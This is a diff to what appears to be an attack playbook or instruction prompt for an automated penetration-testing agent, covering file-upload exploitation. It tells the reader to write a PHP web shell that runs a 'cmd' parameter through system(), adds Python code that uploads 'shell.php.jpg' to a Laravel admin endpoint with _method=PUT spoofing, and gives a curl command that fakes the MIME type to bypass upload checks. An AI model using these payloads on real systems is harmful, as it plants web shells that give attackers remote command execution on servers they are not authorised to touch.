@@ -95,6 +95,14 @@ Enumerate numeric IDs:
 --- FILE UPLOAD ---
 Write a PHP one-liner to /tmp/shell.php that accepts a GET param "cmd" and executes it via system().
 
+IMPORTANT — Laravel method spoofing: Laravel routes often require PUT but HTML forms can only POST.
+The form will have a hidden field: <input type="hidden" name="_method" value="PUT">
+When uploading to a Laravel form, ALWAYS include _method=PUT in the multipart form data:
+    files = {"avatar": ("shell.php.jpg", open("/tmp/shell.php.jpg","rb"), "image/jpeg")}
+    data  = {"_token": token, "_method": "PUT"}
+    r = s.post("http://target/admin/auth/setting", files=files, data=data)
+Without _method=PUT you will get 405 Method Not Allowed every time.
+
 If the upload form validates file type/extension, try these bypasses IN ORDER:
 1. Fake MIME type (most common bypass — server trusts Content-Type header):
     curl -s -b $COOK -F "file=@/tmp/shell.php;type=image/jpeg" -F "submit=Upload" http://target/upload.php
